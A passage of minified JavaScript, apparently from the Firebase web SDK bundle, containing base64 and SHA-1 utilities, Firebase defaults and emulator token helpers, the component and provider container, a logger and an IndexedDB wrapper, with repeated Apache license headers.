t=0;t<this.ENCODED_VALS.length;t++)this.byteToCharMap_[t]=this.ENCODED_VALS.charAt(t),this.charToByteMap_[this.byteToCharMap_[t]]=t,this.byteToCharMapWebSafe_[t]=this.ENCODED_VALS_WEBSAFE.charAt(t),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[t]]=t,t>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(t)]=t,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(t)]=t)}}};class o_ extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const gx=function(t){const e=mx(t);return Ou.encodeByteArray(e,!0)},Da=function(t){return gx(t).replace(/\./g,"")},md=function(t){try{return Ou.decodeString(t,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function a_(t){return xx(void 0,t)}function xx(t,e){if(!(e instanceof Object))return e;switch(e.constructor){case Date:const n=e;return new Date(n.getTime());case Object:t===void 0&&(t={});break;case Array:t=[];break;default:return e}for(const n in e)!e.hasOwnProperty(n)||!l_(n)||(t[n]=xx(t[n],e[n]));return t}function l_(t){return t!=="__proto__"}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function c_(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("Unable to locate global object.")}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const d_=()=>c_().__FIREBASE_DEFAULTS__,u_=()=>{if(typeof process>"u"||typeof Ff>"u")return;const t=Ff.__FIREBASE_DEFAULTS__;if(t)return JSON.parse(t)},p_=()=>{if(typeof document>"u")return;let t;try{t=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const e=t&&md(t[1]);return e&&JSON.parse(e)},vx=()=>{try{return d_()||u_()||p_()}catch(t){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${t}`);return}},f_=t=>{var e,n;return(n=(e=vx())===null||e===void 0?void 0:e.emulatorHosts)===null||n===void 0?void 0:n[t]},h_=t=>{const e=f_(t);if(!e)return;const n=e.lastIndexOf(":");if(n<=0||n+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);const r=parseInt(e.substring(n+1),10);return e[0]==="["?[e.substring(1,n-1),r]:[e.substring(0,n),r]},yx=()=>{var t;return(t=vx())===null||t===void 0?void 0:t.config};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ho{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,n)=>{this.resolve=e,this.reject=n})}wrapCallback(e){return(n,r)=>{n?this.reject(n):this.resolve(r),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(n):e(n,r))}}}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function m_(t,e){if(t.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const n={alg:"none",type:"JWT"},r=e||"demo-project",s=t.iat||0,o=t.sub||t.user_id;if(!o)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const a=Object.assign({iss:`https://securetoken.google.com/${r}`,aud:r,iat:s,exp:s+3600,auth_time:s,sub:o,user_id:o,firebase:{sign_in_provider:"custom",identities:{}}},t);return[Da(JSON.stringify(n)),Da(JSON.stringify(a)),""].join(".")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function g_(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function bx(){return typeof window<"u"&&!!(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(g_())}function x_(){return typeof navigator=="object"&&navigator.product==="ReactNative"}function v_(){return hx.NODE_ADMIN===!0}function y_(){try{return typeof indexedDB=="object"}catch{return!1}}function b_(){return new Promise((t,e)=>{try{let n=!0;const r="validate-browser-context-for-indexeddb-analytics-module",s=self.indexedDB.open(r);s.onsuccess=()=>{s.result.close(),n||self.indexedDB.deleteDatabase(r),t(!0)},s.onupgradeneeded=()=>{n=!1},s.onerror=()=>{var o;e(((o=s.error)===null||o===void 0?void 0:o.message)||"")}}catch(n){e(n)}})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const __="FirebaseError";class mo extends Error{constructor(e,n,r){super(n),this.code=e,this.customData=r,this.name=__,Object.setPrototypeOf(this,mo.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,_x.prototype.create)}}class _x{constructor(e,n,r){this.service=e,this.serviceName=n,this.errors=r}create(e,...n){const r=n[0]||{},s=`${this.service}/${e}`,o=this.errors[e],a=o?w_(o,r):"Error",l=`${this.serviceName}: ${a} (${s}).`;return new mo(s,l,r)}}function w_(t,e){return t.replace(S_,(n,r)=>{const s=e[r];return s!=null?String(s):`<${r}?>`})}const S_=/\{\$([^}]+)}/g;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ki(t){return JSON.parse(t)}function Ue(t){return JSON.stringify(t)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wx=function(t){let e={},n={},r={},s="";try{const o=t.split(".");e=Ki(md(o[0])||""),n=Ki(md(o[1])||""),s=o[2],r=n.d||{},delete n.d}catch{}return{header:e,claims:n,data:r,signature:s}},C_=function(t){const e=wx(t),n=e.claims;return!!n&&typeof n=="object"&&n.hasOwnProperty("iat")},j_=function(t){const e=wx(t).claims;return typeof e=="object"&&e.admin===!0};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function gn(t,e){return Object.prototype.hasOwnProperty.call(t,e)}function Es(t,e){if(Object.prototype.hasOwnProperty.call(t,e))return t[e]}function Wf(t){for(const e in t)if(Object.prototype.hasOwnProperty.call(t,e))return!1;return!0}function La(t,e,n){const r={};for(const s in t)Object.prototype.hasOwnProperty.call(t,s)&&(r[s]=e.call(n,t[s],s,t));return r}function gd(t,e){if(t===e)return!0;const n=Object.keys(t),r=Object.keys(e);for(const s of n){if(!r.includes(s))return!1;const o=t[s],a=e[s];if($f(o)&&$f(a)){if(!gd(o,a))return!1}else if(o!==a)return!1}for(const s of r)if(!n.includes(s))return!1;return!0}function $f(t){return t!==null&&typeof t=="object"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function k_(t){const e=[];for(const[n,r]of Object.entries(t))Array.isArray(r)?r.forEach(s=>{e.push(encodeURIComponent(n)+"="+encodeURIComponent(s))}):e.push(encodeURIComponent(n)+"="+encodeURIComponent(r));return e.length?"&"+e.join("&"):""}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class N_{constructor(){this.chain_=[],this.buf_=[],this.W_=[],this.pad_=[],this.inbuf_=0,this.total_=0,this.blockSize=512/8,this.pad_[0]=128;for(let e=1;e<this.blockSize;++e)this.pad_[e]=0;this.reset()}reset(){this.chain_[0]=1732584193,this.chain_[1]=4023233417,this.chain_[2]=2562383102,this.chain_[3]=271733878,this.chain_[4]=3285377520,this.inbuf_=0,this.total_=0}compress_(e,n){n||(n=0);const r=this.W_;if(typeof e=="string")for(let f=0;f<16;f++)r[f]=e.charCodeAt(n)<<24|e.charCodeAt(n+1)<<16|e.charCodeAt(n+2)<<8|e.charCodeAt(n+3),n+=4;else for(let f=0;f<16;f++)r[f]=e[n]<<24|e[n+1]<<16|e[n+2]<<8|e[n+3],n+=4;for(let f=16;f<80;f++){const u=r[f-3]^r[f-8]^r[f-14]^r[f-16];r[f]=(u<<1|u>>>31)&4294967295}let s=this.chain_[0],o=this.chain_[1],a=this.chain_[2],l=this.chain_[3],c=this.chain_[4],d,p;for(let f=0;f<80;f++){f<40?f<20?(d=l^o&(a^l),p=1518500249):(d=o^a^l,p=1859775393):f<60?(d=o&a|l&(o|a),p=2400959708):(d=o^a^l,p=3395469782);const u=(s<<5|s>>>27)+d+c+p+r[f]&4294967295;c=l,l=a,a=(o<<30|o>>>2)&4294967295,o=s,s=u}this.chain_[0]=this.chain_[0]+s&4294967295,this.chain_[1]=this.chain_[1]+o&4294967295,this.chain_[2]=this.chain_[2]+a&4294967295,this.chain_[3]=this.chain_[3]+l&4294967295,this.chain_[4]=this.chain_[4]+c&4294967295}update(e,n){if(e==null)return;n===void 0&&(n=e.length);const r=n-this.blockSize;let s=0;const o=this.buf_;let a=this.inbuf_;for(;s<n;){if(a===0)for(;s<=r;)this.compress_(e,s),s+=this.blockSize;if(typeof e=="string"){for(;s<n;)if(o[a]=e.charCodeAt(s),++a,++s,a===this.blockSize){this.compress_(o),a=0;break}}else for(;s<n;)if(o[a]=e[s],++a,++s,a===this.blockSize){this.compress_(o),a=0;break}}this.inbuf_=a,this.total_+=n}digest(){const e=[];let n=this.total_*8;this.inbuf_<56?this.update(this.pad_,56-this.inbuf_):this.update(this.pad_,this.blockSize-(this.inbuf_-56));for(let s=this.blockSize-1;s>=56;s--)this.buf_[s]=n&255,n/=256;this.compress_(this.buf_);let r=0;for(let s=0;s<5;s++)for(let o=24;o>=0;o-=8)e[r]=this.chain_[s]>>o&255,++r;return e}}function xl(t,e){return`${t} failed: ${e} argument `}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const E_=function(t){const e=[];let n=0;for(let r=0;r<t.length;r++){let s=t.charCodeAt(r);if(s>=55296&&s<=56319){const o=s-55296;r++,$(r<t.length,"Surrogate pair missing trail surrogate.");const a=t.charCodeAt(r)-56320;s=65536+(o<<10)+a}s<128?e[n++]=s:s<2048?(e[n++]=s>>6|192,e[n++]=s&63|128):s<65536?(e[n++]=s>>12|224,e[n++]=s>>6&63|128,e[n++]=s&63|128):(e[n++]=s>>18|240,e[n++]=s>>12&63|128,e[n++]=s>>6&63|128,e[n++]=s&63|128)}return e},vl=function(t){let e=0;for(let n=0;n<t.length;n++){const r=t.charCodeAt(n);r<128?e++:r<2048?e+=2:r>=55296&&r<=56319?(e+=4,n++):e+=3}return e};/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function $r(t){return t&&t._delegate?t._delegate:t}class Qi{constructor(e,n,r){this.name=e,this.instanceFactory=n,this.type=r,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Sr="[DEFAULT]";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class I_{constructor(e,n){this.name=e,this.container=n,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const n=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(n)){const r=new ho;if(this.instancesDeferred.set(n,r),this.isInitialized(n)||this.shouldAutoInitialize())try{const s=this.getOrInitializeService({instanceIdentifier:n});s&&r.resolve(s)}catch{}}return this.instancesDeferred.get(n).promise}getImmediate(e){var n;const r=this.normalizeInstanceIdentifier(e==null?void 0:e.identifier),s=(n=e==null?void 0:e.optional)!==null&&n!==void 0?n:!1;if(this.isInitialized(r)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:r})}catch(o){if(s)return null;throw o}else{if(s)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(T_(e))try{this.getOrInitializeService({instanceIdentifier:Sr})}catch{}for(const[n,r]of this.instancesDeferred.entries()){const s=this.normalizeInstanceIdentifier(n);try{const o=this.getOrInitializeService({instanceIdentifier:s});r.resolve(o)}catch{}}}}clearInstance(e=Sr){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter(n=>"INTERNAL"in n).map(n=>n.INTERNAL.delete()),...e.filter(n=>"_delete"in n).map(n=>n._delete())])}isComponentSet(){return this.component!=null}isInitialized(e=Sr){return this.instances.has(e)}getOptions(e=Sr){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:n={}}=e,r=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(r))throw Error(`${this.name}(${r}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const s=this.getOrInitializeService({instanceIdentifier:r,options:n});for(const[o,a]of this.instancesDeferred.entries()){const l=this.normalizeInstanceIdentifier(o);r===l&&a.resolve(s)}return s}onInit(e,n){var r;const s=this.normalizeInstanceIdentifier(n),o=(r=this.onInitCallbacks.get(s))!==null&&r!==void 0?r:new Set;o.add(e),this.onInitCallbacks.set(s,o);const a=this.instances.get(s);return a&&e(a,s),()=>{o.delete(e)}}invokeOnInitCallbacks(e,n){const r=this.onInitCallbacks.get(n);if(r)for(const s of r)try{s(e,n)}catch{}}getOrInitializeService({instanceIdentifier:e,options:n={}}){let r=this.instances.get(e);if(!r&&this.component&&(r=this.component.instanceFactory(this.container,{instanceIdentifier:R_(e),options:n}),this.instances.set(e,r),this.instancesOptions.set(e,n),this.invokeOnInitCallbacks(r,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,r)}catch{}return r||null}normalizeInstanceIdentifier(e=Sr){return this.component?this.component.multipleInstances?e:Sr:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}}function R_(t){return t===Sr?void 0:t}function T_(t){return t.instantiationMode==="EAGER"}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class A_{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const n=this.getProvider(e.name);if(n.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);n.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const n=new I_(e,this);return this.providers.set(e,n),n}getProviders(){return Array.from(this.providers.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var xe;(function(t){t[t.DEBUG=0]="DEBUG",t[t.VERBOSE=1]="VERBOSE",t[t.INFO=2]="INFO",t[t.WARN=3]="WARN",t[t.ERROR=4]="ERROR",t[t.SILENT=5]="SILENT"})(xe||(xe={}));const P_={debug:xe.DEBUG,verbose:xe.VERBOSE,info:xe.INFO,warn:xe.WARN,error:xe.ERROR,silent:xe.SILENT},D_=xe.INFO,L_={[xe.DEBUG]:"log",[xe.VERBOSE]:"log",[xe.INFO]:"info",[xe.WARN]:"warn",[xe.ERROR]:"error"},z_=(t,e,...n)=>{if(e<t.logLevel)return;const r=new Date().toISOString(),s=L_[e];if(s)console[s](`[${r}]  ${t.name}:`,...n);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)};class Sx{constructor(e){this.name=e,this._logLevel=D_,this._logHandler=z_,this._userLogHandler=null}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in xe))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?P_[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,xe.DEBUG,...e),this._logHandler(this,xe.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,xe.VERBOSE,...e),this._logHandler(this,xe.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,xe.INFO,...e),this._logHandler(this,xe.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,xe.WARN,...e),this._logHandler(this,xe.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,xe.ERROR,...e),this._logHandler(this,xe.ERROR,...e)}}const M_=(t,e)=>e.some(n=>t instanceof n);let Bf,Uf;function O_(){return Bf||(Bf=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function F_(){return Uf||(Uf=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const Cx=new WeakMap,xd=new WeakMap,jx=new WeakMap,lc=new WeakMap,Fu=new WeakMap;function W_(t){const e=new Promise((n,r)=>{const s=()=>{t.removeEventListener("success",o),t.removeEventListener("error",a)},o=()=>{n(rr(t.result)),s()},a=()=>{r(t.error),s()};t.addEventListener("success",o),t.addEventListener("error",a)});return e.then(n=>{n instanceof IDBCursor&&Cx.set(n,t)}).catch(()=>{}),Fu.set(e,t),e}function $_(t){if(xd.has(t))return;const e=new Promise((n,r)=>{const s=()=>{t.removeEventListener("complete",o),t.removeEventListener("error",a),t.removeEventListener("abort",a)},o=()=>{n(),s()},a=()=>{r(t.error||new DOMException("AbortError","AbortError")),s()};t.addEventListener("complete",o),t.addEventListener("error",a),t.addEventListener("abort",a)});xd.set(t,e)}let vd={get(t,e,n){if(t instanceof IDBTransaction){if(e==="done")return xd.get(t);if(e==="objectStoreNames")return t.objectStoreNames||jx.get(t);if(e==="store")return n.objectStoreNames[1]?void 0:n.objectStore(n.objectStoreNames[0])}return rr(t[e])},set(t,e,n){return t[e]=n,!0},has(t,e){return t instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in t}};function B_(t){vd=t(vd)}function U_(t){return t===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...n){const r=t.call(cc(this),e,...n);return jx.set(r,e.sort?e.sort():[e]),rr(r)}:F_().includes(t)?function(...e){return t.apply(cc(this),e),rr(Cx.get(this))}:function(...e){return rr(t.apply(cc(this),e))}}function H_(t){return typeof t=="function"?U_(t):(t instanceof IDBTransaction&&$_(t),M_(t,O_())?new Proxy(t,vd):t)}function rr(t){if(t instanceof IDBRequest)return W_(t);if(lc.has(t))return lc.get(t);const e=H_(t);return e!==t&&(lc.set(t,e),Fu.set(e,t)),e}const cc=t=>Fu.get(t);function V_(t,e,{blocked:n,upgrade:r,blocking:s,terminated:o}={}){const a=indexedDB.open(t,e),l=rr(a);return r&&a.addEventListener("upgradeneeded",c=>{r(rr(a.result),c.oldVersion,c.newVersion,rr(a.transaction),c)}),n&&a.addEventListener("blocked",c=>n(c.oldVersion,c.newVersion,c)),l.then(c=>{o&&c.addEventListener("close",()=>o()),s&&c.addEventListener("versionchange",d=>s(d.oldVersion,d.newVersion,d))}).catch(()=>{}),l}const G_=["get","getKey","getAll","getAllKeys","count"],Y_=["put","add","delete","clear"],dc=new Map;function Hf(t,e){if(!(t instanceof IDBDatabase&&!(e in t)&&typeof e=="string"))return;if(dc.get(e))return dc.get(e);const n=e.replace(/FromIndex$/,""),r=e!==n,s=Y_.includes(n);if(!(n in(r?IDBIndex:IDBObjectStore).prototype)||!(s||G_.includes(n)))return;const o=async function(a,...l){const c=this.transaction(a,s?"readwrite":"readonly");let d=c.store;return r&&(d=d.index(l.shift())),(await Promise.all([d[n](...l),s&&c.done]))[0]};return dc.set(e,o),o}B_(t=>({...t,get:(e,n,r)=>Hf(e,n)||t.get(e,n,r),has:(e,n)=>!!Hf(e,n)||t.has(e,n)}));/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class K_{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(n=>{if(Q_(n)){const r=n.getImmediate();return`${r.library}/${r.version}`}else return null}).filter(n=>n).join(" ")}}function Q_(t){const e=t.getComponent();return(e==null?void 0:e.type)==="VERSION"}const yd="@firebase/app",Vf="0.10.13";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ln=new Sx("@firebase/app"),q_="@firebase/app-compat",X_="@firebase/analytics-compat",J_="@firebase/analytics",Z_="@firebase/app-check-compat",ew="@firebase/app-check",tw="@firebase/auth",nw="@firebase/auth-compat",rw="@firebase/database",sw="@firebase/data-connect",iw="@firebase/database-compat",ow="@firebase/functions",aw="@firebase/functions-compat",lw="@firebase/installations",cw="@firebase/installations-compat",dw="@firebase/messaging",uw="@firebase/messaging-compat",pw="@firebase/performance",fw="@firebase/performance-compat",hw="@firebase/remote-config",mw="@firebase/remote-config-compat",gw="@firebase/storage",xw="@firebase/storage-compat",vw="@firebase/firestore",yw="@firebase/vertexai-preview",bw="@firebase/firestore-compat",_w="firebase",ww="10.14.1";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
